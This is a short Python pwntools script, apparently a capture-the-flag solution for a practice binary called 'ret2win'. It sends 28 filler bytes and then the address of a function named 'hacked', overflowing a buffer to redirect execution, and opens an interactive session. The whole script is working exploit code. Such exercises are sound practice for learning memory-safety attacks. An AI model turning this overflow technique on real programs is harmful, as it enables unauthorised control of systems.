from pwn import *

elf = ELF("./ret2win")

buff = b"A"*28
buff+= p32(elf.symbols["hacked"])

p = elf.process()


p.recvline()

p.sendline(buff)

p.interactive()